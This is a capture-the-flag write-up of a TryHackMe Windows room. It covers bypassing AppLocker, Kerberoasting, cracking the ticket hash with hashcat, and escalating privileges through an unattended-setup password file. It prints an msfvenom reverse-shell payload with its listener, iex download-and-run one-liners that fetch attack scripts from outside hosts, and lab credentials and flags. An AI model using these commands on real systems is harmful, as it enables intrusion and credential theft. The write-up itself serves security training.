
In this room we will be working with ways to bypass the Windows whitelisting Application called Applocker.

Task1 - Deploy the Windows machine
-----------------------------------------------------------

In this room you will learn the following:

1.  Windows Forensics
2.  Basics of kerberoasting
3.  AV Evading
4.  Applocker




__Questions__

Deploy the windows machine, you will be able to control this in your browser. However if you prefer to use your own RDP client, the credentials are below.

Username: `corp\dark`
Password: `_QuejVudId6`

Answer: _None needed_

Task2 - Bypassing Applocker
--------------------------------------------------

If Applocker is installed, it is possible to bypass it by putting executables in certain directories which Applocker is programmed to ignore using the default configuration. One of these locations is `C:\Windows\System32\spool\drivers\color`

Using powershell, download an executable into the above directory.

I will make a backdoor using msfvenom for this:
```bash
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/corp]
└─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=tun0 LPORT=4444 -f exe -o backdoor.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: backdoor.exe
                                                                                                                                                
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/corp]
└─$ ls
backdoor.exe
                                                                                                                                                
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/corp]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.145.1 - - [23/Nov/2022 10:25:46] "GET /backdoor.exe HTTP/1.1" 200 -

```

```powershell
$URL="https://tun0_ip/backdoor.exe"
$Path="backdoor.exe"
Invoke-WebRequest -URI $URL -OutFile $Path
```

```
PS C:\Windows\System32\spool\drivers\color> $URL="http://$TUN0/backdoor.exe"

PS C:\Windows\System32\spool\drivers\color> $Path="backdoor.exe"

PS C:\Windows\System32\spool\drivers\color> Invoke-WebRequest -URI $URL -OutFile $Path

PS C:\Windows\System32\spool\drivers\color> dir

    Directory: C:\Windows\System32\spool\drivers\color

Mode                LastWriteTime         Length Name

----                -------------         ------ ----

-a----       11/23/2022   1:25 AM          73802 backdoor.exe
-a----        9/15/2018   7:12 AM           1058 D50.camp
-a----        9/15/2018   7:12 AM           1079 D65.camp
-a----        9/15/2018   7:12 AM            797 Graphics.gmmp
-a----        9/15/2018   7:12 AM            838 MediaSim.gmmp
-a----        9/15/2018   7:12 AM            786 Photo.gmmp
-a----        9/15/2018   7:12 AM            822 Proofing.gmmp
-a----        9/15/2018   7:12 AM         218103 RSWOP.icm
-a----        9/15/2018   7:12 AM           3144 sRGB Color Space Profile.icm
-a----        9/15/2018   7:12 AM          17155 wscRGB.cdmp
-a----        9/15/2018   7:12 AM           1578 wsRGB.cdmp

PS C:\Windows\System32\spool\drivers\color>
```

Now let's start a Meterpreter multi/handler on our attackbox:
```bash
┌──(kali㉿kali)-[~]
└─$ msfconsole -q                                                                                                                   
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on tun0:4444 
```

Start the process in powershell to get a callback:
```powershell
Start-Process "backdoor.exe"
```

```powershell
PS C:\Windows\System32\spool\drivers\color> Start-Process "backdoor.exe"

Start-Process : This command cannot be run due to the error: Operation did not complete successfully because the file

contains a virus or potentially unwanted software.

At line:1 char:1

+ Start-Process "backdoor.exe"

+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException

    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand

```

So we do have full security running so we can't yet do a simple backdoor. Let's try it with putty which is a simple SSH cilent freely available. I pull that first to my attackbox and then host it as I did above with the same running python http.server. Then pull it from the Windows Corp box:

```powershell

PS C:\Windows\System32\spool\drivers\color> $URL="http://$TUN0/putty.exe"

PS C:\Windows\System32\spool\drivers\color> $Path="putty.exe"

PS C:\Windows\System32\spool\drivers\color> Invoke-WebRequest -URI $URL -OutFile $Path

PS C:\Windows\System32\spool\drivers\color> Start-Process "putty.exe"
```

![[corp1.png]]

So we did bypass the Applocker restriction at least.


__Questions__

There are many ways to bypass AppLocker.

If AppLocker is configured with default AppLocker rules, we can bypass it by placing our executable in the following directory: `C:\Windows\System32\spool\drivers\color` - This is whitelisted by default.

Go ahead and use Powershell to download an executable of your choice locally, place it the whitelisted directory and execute it.
Answer: _None Needed_

Just like Linux bash, Windows powershell saves all previous commands into a file called `ConsoleHost_history`. This is located at ``%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

```shell-session
PS C:\Users\dark\Appdata\Roaming\Microsoft\Windows\PowerShell\PSReadLine> dir

    Directory: C:\Users\dark\Appdata\Roaming\Microsoft\Windows\PowerShell\PSReadLine

Mode                LastWriteTime         Length Name

----                -------------         ------ ----

-a----       11/23/2022   1:56 AM            958 ConsoleHost_history.txt

PS C:\Users\dark\Appdata\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type .\ConsoleHost_history.txt

ls
dir
Get-Content test
flag{a12a41b5f8111327690f836e9b302f0b}
iex(new-object net.webclient).DownloadString('http://127.0.0.1/test.ps1')
cls
exit
cd C:\Windows\System32\spool\drivers\color
```

![[corp2.png]]

Access the file and and obtain the flag.
Answer: _flag{a12a41b5f8111327690f836e9b302f0b}_


Task3 - Kerberoasting
----------------------------------------

In this room we will be doing some Kerberoasting.

__Questions__

Lets first enumerate Windows. If we run `setspn -T medin -Q ​ */*`
we can extract all accounts in the SPN.

```powershell
C:\Users\dark>setspn -T medin -Q */*

Ldap Error(0x51 -- Server Down): ldap_connect

Failed to retrieve DN for domain "medin" : 0x00000051

Warning: No valid targets specified, reverting to current domain.

CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
        ldap/omega.corp.local/ForestDnsZones.corp.local
        ldap/omega.corp.local/DomainDnsZones.corp.local
        TERMSRV/OMEGA
        TERMSRV/omega.corp.local
        DNS/omega.corp.local
        GC/omega.corp.local/corp.local
        RestrictedKrbHost/omega.corp.local
        RestrictedKrbHost/OMEGA
        RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        HOST/OMEGA/CORP
        HOST/omega.corp.local/CORP
        HOST/OMEGA
        HOST/omega.corp.local
        HOST/omega.corp.local/corp.local
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local
        ldap/
        ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        ldap/omega.corp.local/CORP
        ldap/OMEGA
        ldap/omega.corp.local
        ldap/omega.corp.local/corp.local
CN=krbtgt,CN=Users,DC=corp,DC=local
        kadmin/changepw
CN=fela,CN=Users,DC=corp,DC=local
        HTTP/fela
        HOST/fela@corp.local
        HTTP/fela@corp.local
Existing SPN found!



C:\Users\dark>
```

![[corp3.png]]

SPN is the Service Principal Name, and is the mapping between service and account.

Running that command, we find an existing SPN. What user is that for?
Answer: _fela_


Now that we have found an SPN for a user, we can use Invoke-Kerberoast to get a ticket.
We can download it like this:
```powershell
iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
```

Then launch it:
```powershell
Invoke-Kerberoast -OutputFormat hashcat ​ |fl
```

NOTE: Replace $TUN0 with your VPN's TUN0 IP or Attackbox IP.
```powershell
PS C:\Users\dark> cd C:\Windows\System32\spool\drivers\color
PS C:\Windows\System32\spool\drivers\color> iex(New-Object Net.WebClient).DownloadString('http://$TUN0/Invoke-Kerberoast.ps1')
PS C:\Windows\System32\spool\drivers\color> Invoke-Kerberoast -OutputFormat hashcat |fl


TicketByteHexStream  :

Hash                 : $krb5tgs$23$*fela$corp.local$HTTP/fela*$53F4AF258E2CB5AF3132BF616E2C3FB0$9E6E238C4EFA7AF23C5A8DE953DF6189204DC07420D3C804ADAD78CA9A31D7F2367FC601E446D481ADB1F92907FCA6BAB356B8824729CCA82C502D77F10B8F72D9DE45DAA710941E603A31D9853AB24F034F94FA4F9957FA3D8F2A7C156BF65793A64155C884BFD334845B7279800582FE3C0F56503274B7BFBC75ACC8228BFD3EB33A55AB0EA607CA6A0CCA243849DD34473367DDD1C0048C23156D98DF621C105470AE8B620E0867FF02914DEECE739471307930799984A16751CA1CDBF0F02DA2E5C7E078D275F14AC74ECABF1022432A6CFCA3F5D7D0CFF6DA814919F2DB1CA71189EE64DC8BD75BC78C0EA5FB63519AA868F8F89437C030C1D4C9289CCE648A56A88D10B9DDB07E7B2F6193683A8269416286DC20CC043B2F18B1C583F81577BEDD328D9C16F20C379BA408811B8DA8BE11669067E8785AB097B5A54A4B7F07606543A9BACFE125D24A1424E53D5EEFC7152F69842D86BC9AA72EFC5FC0B22E54E3A4AA2D1E9CA6D430B8AF45625F1A0529D1A11EE245FE51F37EA24CD59C48C7E043C683166F0B4A278A9234162D3E049AFF3C6FE988269D8F47D96787336C961668969748DF2D13B60E89267CF854C282A9530D5E63CA120B0967210FEE13CD5DFB142C69DBDDF33F36BE474F57A404863DDFC0DADB64A635ED72F027C9043E213D857E8A03D8A85D2AE306D7E17C02989C52D4340A25226941956E923EB6A4A490B5B6E8186B1EC8B064BCB026B3BE8C9FB58056A72D848248381992051B058F19DDCEB2256E557CD1BCBC58E1E4047760A0DE1C773E2642A6830E9FBA22B9E8567FF1E003B767D23DBF5B8DECE72493C286E1A3AD2EECAEE2631EBC1A37AB4054E835EDB5CC0EEEC2D6D1538516E716014ECF1BB0DD9FC94F48328D65BB2DA1125F31C250F5FE57E3424028B03A09DB6FF78EB9BC989CC5F9DE186DEF85990A625E57445D047E0D999BF2BEB367A90311CA68C467200FA892AACAA3F976DCBC54FE3BADE4678281B5FBEAF43DB7451E9A91F55DD806B75B42CD1749C73A2DC811808E2DC04815283BA30E5C6508AAC07AFF7EECB06051350F3D36AC373F2BC7DAAA1BAC0B84A6FA84F486FD9683E29097C6B47E7CCB68C0105745401166A6AF0E8D9C7C2716EBD5ED58EAD8F1443DB3FB47FB47885274D3CDE71D825E07530E983127EA94406853876399C9EF78088DFA03FF7B660943B97C9E1D2190F739AD99606FFFE78CE905DEFA7C087D7679DED545BB2D513CB8B4E3676B60C75314BE7C43564D66B8FB64394DE012798B644B08CCE232ACE1B45D943C182DF45058C521B96790A724191FC4708AEDCD952F9F760E365F767AC46994B67888891A351828166E69C16D21A7908ADFC23F2E008D9C239AADB1C02851522DCFA0E2

SamAccountName       : fela
DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local
ServicePrincipalName : HTTP/fela
```

![[corp4.png]]

Answer: _None needed_

Now we need to use hashcat to bruteforce this password. The type of hash is Kerberos 5 TGS-REP etype 23, so we need to use the hashcat code of 13100.

`hashcat -m 13100 -a 0 hash.txt wordlist --force`

```bash
# hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v6.1.1-66-g6a419d06) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz, 3878/3942 MB (985 MB allocatable), 2MCU

OpenCL API (OpenCL 1.2 pocl 1.1 None+Asserts, LLVM 6.0.0, SPIR, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
===========================================================================================================================
* Device #2: pthread-Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 35 MB

Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553435 bytes (23.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 67106875 bytes (47.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 100660309 bytes (71.Dictionary cache building /usr/share/wordlists/rockyou.txt: 134213745 bytes (95.Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 7 secs

$krb5tgs$23$*fela$corp.local$HTTP/fela*$53f4af258e2cb5af3132bf616e2c3fb0$9e6e238c4efa7af23c5a8de953df6189204dc07420d3c804adad78ca9a31d7f2367fc601e446d481adb1f92907fca6bab356b8824729cca82c502d77f10b8f72d9de45daa710941e603a31d9853ab24f034f94fa4f9957fa3d8f2a7c156bf65793a64155c884bfd334845b7279800582fe3c0f56503274b7bfbc75acc8228bfd3eb33a55ab0ea607ca6a0cca243849dd34473367ddd1c0048c23156d98df621c105470ae8b620e0867ff02914deece739471307930799984a16751ca1cdbf0f02da2e5c7e078d275f14ac74ecabf1022432a6cfca3f5d7d0cff6da814919f2db1ca71189ee64dc8bd75bc78c0ea5fb63519aa868f8f89437c030c1d4c9289cce648a56a88d10b9ddb07e7b2f6193683a8269416286dc20cc043b2f18b1c583f81577bedd328d9c16f20c379ba408811b8da8be11669067e8785ab097b5a54a4b7f07606543a9bacfe125d24a1424e53d5eefc7152f69842d86bc9aa72efc5fc0b22e54e3a4aa2d1e9ca6d430b8af45625f1a0529d1a11ee245fe51f37ea24cd59c48c7e043c683166f0b4a278a9234162d3e049aff3c6fe988269d8f47d96787336c961668969748df2d13b60e89267cf854c282a9530d5e63ca120b0967210fee13cd5dfb142c69dbddf33f36be474f57a404863ddfc0dadb64a635ed72f027c9043e213d857e8a03d8a85d2ae306d7e17c02989c52d4340a25226941956e923eb6a4a490b5b6e8186b1ec8b064bcb026b3be8c9fb58056a72d848248381992051b058f19ddceb2256e557cd1bcbc58e1e4047760a0de1c773e2642a6830e9fba22b9e8567ff1e003b767d23dbf5b8dece72493c286e1a3ad2eecaee2631ebc1a37ab4054e835edb5cc0eeec2d6d1538516e716014ecf1bb0dd9fc94f48328d65bb2da1125f31c250f5fe57e3424028b03a09db6ff78eb9bc989cc5f9de186def85990a625e57445d047e0d999bf2beb367a90311ca68c467200fa892aacaa3f976dcbc54fe3bade4678281b5fbeaf43db7451e9a91f55dd806b75b42cd1749c73a2dc811808e2dc04815283ba30e5c6508aac07aff7eecb06051350f3d36ac373f2bc7daaa1bac0b84a6fa84f486fd9683e29097c6b47e7ccb68c0105745401166a6af0e8d9c7c2716ebd5ed58ead8f1443db3fb47fb47885274d3cde71d825e07530e983127ea94406853876399c9ef78088dfa03ff7b660943b97c9e1d2190f739ad99606fffe78ce905defa7c087d7679ded545bb2d513cb8b4e3676b60c75314be7c43564d66b8fb64394de012798b644b08cce232ace1b45d943c182df45058c521b96790a724191fc4708aedcd952f9f760e365f767ac46994b67888891a351828166e69c16d21a7908adfc23f2e008d9c239aadb1c02851522dcfa0e2:rubenF124
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*fela$corp.local$HTTP/fela*$53f4af258e2...cfa0e2
Time.Started.....: Wed Nov 23 02:39:56 2022, (19 secs)
Time.Estimated...: Wed Nov 23 02:40:15 2022, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   217.8 kH/s (5.64ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4132864/14344384 (28.81%)
Rejected.........: 0/4132864 (0.00%)
Restore.Point....: 4128768/14344384 (28.78%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: ruddqoo -> ruben5277

Started: Wed Nov 23 02:39:02 2022
Stopped: Wed Nov 23 02:40:17 2022
```

__Questions__

Crack the hash. What is the users password in plain text?
Answer: _rubenF124_

Login as this user. What is his flag?

![[corp5.png]]
Answer: _flag{bde1642535aa396d2439d86fe54a36e4}_


Task4 - Privilege Escalation
------------------------------------------------

In this task we will use powershell script to examine the best course to get Admin access.

First we need to download the PowerUp1.ps1 script.

We can download and install by using this:
```powershell
iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1')
```

The script identifies a few ways to PrivEsc.

a bypassUAC and an UnattendedPath. We will use the 2nd one.

"Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode." Read more about it [here](https://support.microsoft.com/en-us/topic/77504e1d-2b75-5be1-3eef-cec3617cc461).

It is also where users passwords are stored in base64. Navigate to C:\Windows\Panther\Unattend\Unattended.xml.

![[corp6.png]]

```bash
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/corp]
└─$ cat unattended.pass                                        
dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=
                                                                                                                                                
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/corp]
└─$ cat unattended.pass | base64 -d
tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T            
```

__Questions__


What is the decoded password?
Answer: _tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T_

Now we have the Administrator's password, login as them and obtain the last flag.

![[corp7.png]]

Answer: _THM{g00d_j0b_SYS4DM1n_M4s73R}_

NOTE: There is a bug with xfreerdp at this time. You need to use another rdp client to login.

